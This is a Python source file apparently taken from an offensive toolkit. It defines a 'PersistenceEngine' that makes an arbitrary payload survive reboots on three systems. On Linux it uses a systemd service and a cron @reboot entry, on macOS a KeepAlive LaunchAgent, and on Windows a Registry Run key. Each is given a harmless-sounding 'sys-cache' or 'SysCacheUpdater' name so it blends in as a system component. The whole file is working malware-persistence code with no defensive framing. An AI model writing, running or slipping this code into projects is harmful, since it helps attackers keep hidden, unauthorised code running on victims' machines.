import os
import subprocess
import platform
from rich.console import Console

console = Console()


class PersistenceEngine:
    def __init__(self, payload_path):
        self.path = os.path.abspath(payload_path)
        self.os_type = platform.system()

    def install_linux_watchdog(self):
        """Creates a dual-point persistence loop for Linux."""
        # 1. Systemd Service
        service_path = "/etc/systemd/system/sys-cache.service"
        service_code = f"""[Unit]\nDescription=System Cache Service\n[Service]\nExecStart={self.path}\nRestart=always\n[Install]\nWantedBy=multi-user.target"""

        cron_cmd = f"(crontab -l 2>/dev/null; echo '@reboot {self.path}') | crontab -"

        try:
            if os.getuid() == 0:
                with open(service_path, "w") as f:
                    f.write(service_code)
                # FIX: Must reload daemon before enabling a new service
                subprocess.run(["systemctl", "daemon-reload"],
                               capture_output=True)
                subprocess.run(
                    ["systemctl", "enable", "sys-cache"], capture_output=True)
                console.print(
                    "[bold green][+] Systemd Service established.[/bold green]")

            # FIX: Check if the command actually succeeds
            result = subprocess.run(cron_cmd, shell=True, capture_output=True)
            if result.returncode == 0:
                console.print(
                    "[bold green][+] Cron reboot persistence established.[/bold green]")
            else:
                console.print(
                    "[yellow][!] Cron persistence failed or crontab not available.[/yellow]")
        except Exception as e:
            console.print(f"[red][!] Linux persistence failed: {e}[/red]")

    def install_mac_launchagent(self):
        """NEW: Implements macOS persistence using LaunchAgents."""
        try:
            plist_content = f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.sys.cache.updater</string>
    <key>ProgramArguments</key>
    <array>
        <string>{self.path}</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <true/>
</dict>
</plist>"""

            # Save to user's LaunchAgents directory
            agent_dir = os.path.expanduser("~/Library/LaunchAgents")
            os.makedirs(agent_dir, exist_ok=True)
            plist_path = os.path.join(agent_dir, "com.sys.cache.updater.plist")

            with open(plist_path, "w") as f:
                f.write(plist_content)

            # Load the LaunchAgent
            subprocess.run(["launchctl", "load", plist_path],
                           capture_output=True)
            console.print(
                "[bold green][+] macOS LaunchAgent persistence established.[/bold green]")
        except Exception as e:
            console.print(f"[red][!] macOS persistence failed: {e}[/red]")

    def install_windows_registry(self):
        """Implements Windows Registry Run Key persistence."""
        try:
            import winreg
            key = winreg.HKEY_CURRENT_USER
            key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
            with winreg.OpenKey(key, key_path, 0, winreg.KEY_SET_VALUE) as reg_key:
                winreg.SetValueEx(reg_key, "SysCacheUpdater",
                                  0, winreg.REG_SZ, self.path)
            console.print(
                "[bold green][+] Windows Registry 'Run' key established.[/bold green]")
        except Exception as e:
            console.print(
                f"[red][!] Windows Registry persistence failed: {e}[/red]")

    def run(self):
        console.print(f"[*] Deploying Persistence for: {self.path}")
        if self.os_type == "Linux":
            self.install_linux_watchdog()
        elif self.os_type == "Darwin":  # macOS
            self.install_mac_launchagent()
        elif self.os_type == "Windows":
            self.install_windows_registry()
        else:
            console.print(
                f"[yellow][!] OS ({self.os_type}) not supported for automated persistence.[/yellow]")
